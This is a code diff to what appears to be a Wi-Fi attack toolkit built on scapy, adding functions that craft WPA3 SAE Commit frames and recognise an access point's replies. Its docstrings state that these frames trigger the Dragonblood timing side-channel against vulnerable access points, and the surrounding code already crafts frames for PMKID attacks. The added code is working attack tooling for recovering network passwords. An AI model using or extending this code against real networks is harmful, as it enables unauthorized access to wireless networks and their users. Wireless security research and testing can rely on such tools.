@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+import os
+
 from scapy.layers.dot11 import (
     Dot11,
     Dot11AssoReq,
@@ -14,9 +16,12 @@ from scapy.layers.dot11 import (
     RadioTap,
 )
 from scapy.layers.eap import EAPOL
-from scapy.packet import Packet
+from scapy.packet import Packet, Raw
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
+
+SAE_AUTH_ALGO = 3  # 802.11's Authentication Algorithm Number for SAE (not in scapy's algo enum)
+SAE_GROUP_P256 = 19  # the mandatory SAE finite cyclic group -- see attacks/dragonblood.py
 
 
 def craft_rsn_ie(akms: list[int] | None = None, mfpc: bool = False, mfpr: bool = False) -> Dot11Elt:
@@ -140,6 +145,61 @@ def craft_auth(bssid: str, client: str, seq: int = 1) -> Packet:
     """Craft an open-system authentication request (used for PMKID attacks)."""
     dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)
     return _inject_radiotap() / dot11 / Dot11Auth(algo=0, seqnum=seq, status=0)
+
+
+def craft_sae_commit(bssid: str, client: str, group: int = SAE_GROUP_P256, seed: bytes | None = None) -> Packet:
+    """Craft an SAE Commit frame (802.11 Authentication, algo=3, seqnum=1)
+    -- the message that kicks off a WPA3 SAE handshake, and the trigger
+    for the Dragonblood timing side-channel (attacks/dragonblood.py):
+    a vulnerable AP receiving this derives ITS OWN password element from
+    the real network password and the client MAC in this frame's addr2,
+    via the timing-variable hunting-and-pecking loop, before replying
+    with its own Commit.
+
+    group: the negotiated finite cyclic group (2 bytes, little-endian) --
+    19 (P-256) is SAE's mandatory group and the only one
+    dragonblood.py's offline math currently models.
+
+    scalar (32 bytes) and element (64 bytes, raw x||y -- SAE does not use
+    TLS-style point compression/prefix bytes) don't need to be
+    cryptographically valid for the timing attack to work: the AP only
+    needs to accept this as a well-formed Commit and start its own real
+    derivation to leak timing, regardless of whether our own scalar/
+    element could complete a real handshake. Random per call (seed
+    overrides both for deterministic tests) rather than all-zero, since
+    an all-zero scalar is a degenerate value some implementations
+    explicitly reject before ever reaching the timing-sensitive path.
+
+    No scapy layer exists for the SAE Commit body (group/scalar/element),
+    so it's appended as a Raw payload after Dot11Auth's fixed fields --
+    same approach frames.py already uses for the WPA1/WPS/OWE vendor IEs
+    in secure.py (scapy's own dissector doesn't cover this either)."""
+    body = seed if seed is not None else os.urandom(32 + 64)
+    if len(body) != 96:
+        raise ValueError("seed must be exactly 96 bytes (32-byte scalar + 64-byte element)")
+    sae_body = group.to_bytes(2, "little") + body
+    dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)
+    return _inject_radiotap() / dot11 / Dot11Auth(algo=SAE_AUTH_ALGO, seqnum=1, status=0) / Raw(load=sae_body)
+
+
+def is_sae_commit(pkt: Packet) -> bool:
+    """True if pkt is an 802.11 Authentication frame carrying an SAE
+    Commit (algo=3, seqnum=1) -- used to recognize a target AP's reply
+    to our own craft_sae_commit() during the Dragonblood timing attack."""
+    auth = pkt.getlayer(Dot11Auth)
+    return bool(auth is not None and auth.algo == SAE_AUTH_ALGO and auth.seqnum == 1)
+
+
+def sae_commit_group(pkt: Packet) -> int | None:
+    """Return the finite cyclic group ID from an SAE Commit frame's body,
+    or None if pkt isn't a recognizable SAE Commit."""
+    if not is_sae_commit(pkt):
+        return None
+    raw_layer = pkt.getlayer(Raw)
+    raw = bytes(raw_layer.load) if raw_layer is not None else b""
+    if len(raw) < 2:
+        return None
+    return int.from_bytes(raw[:2], "little")
 
 
 def craft_probe_req(bssid: str, client: str, ssid: str = "") -> Packet:
